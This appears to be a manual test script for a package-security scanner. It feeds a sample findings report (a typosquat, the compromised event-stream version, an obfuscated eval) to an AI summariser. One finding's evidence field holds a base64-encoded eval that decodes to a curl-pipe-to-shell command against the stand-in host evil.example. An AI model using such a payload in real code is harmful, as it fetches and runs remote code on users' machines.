// Manual check: node scripts/try-gemma.js  (calls the live Gemini API when GEMINI_API_KEY is set)
import { summarizeReport, aiStatus } from '../src/ai/gemma.js';

const report = {
  target: 'demo/trap-app',
  summary: { score: 92, level: 'critical', counts: { critical: 2, high: 1, medium: 0, low: 0 } },
  stats: { files: 12, dependencies: 48 },
  findings: [
    {
      id: 'f1', type: 'typosquat', severity: 'high',
      title: 'Possible typosquat of "cross-env"',
      description: '"crossenv" is one edit away from the popular package "cross-env" and was a known credential-stealing package.',
      package: 'crossenv', version: '6.1.1', file: 'package.json', line: 14,
      evidence: '"crossenv": "^6.1.1"', fix: 'Replace with "cross-env".',
    },
    {
      id: 'f2', type: 'malicious', severity: 'critical',
      title: 'Known-malicious package version event-stream@3.3.6',
      description: 'event-stream 3.3.6 pulled in flatmap-stream, which contained an encrypted payload targeting bitcoin wallets.',
      package: 'event-stream', version: '3.3.6', file: 'package-lock.json', line: 210,
      evidence: '"event-stream": { "version": "3.3.6", "requires": { "flatmap-stream": "0.1.1" } }',
      fix: 'Pin event-stream to 3.3.5 or remove it.',
    },
    {
      id: 'f3', type: 'suspicious-code', severity: 'critical',
      title: 'Obfuscated eval of base64 payload',
      description: 'Decodes a base64 string at runtime and passes it to eval().',
      package: 'left-padder', version: '1.0.2', file: 'node_modules/left-padder/index.js', line: 3,
      evidence: "eval(Buffer.from('cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWMoImN1cmwgaHR0cDovL2V2aWwuZXhhbXBsZS9zaCB8IHNoIik=','base64').toString())",
    },
  ],
};

console.log('aiStatus:', aiStatus());
const t0 = Date.now();
const res = await summarizeReport(report);
console.log(`mode=${res.mode} model=${res.model} elapsedMs=${Date.now() - t0}`);
console.log('---\n' + res.summary);
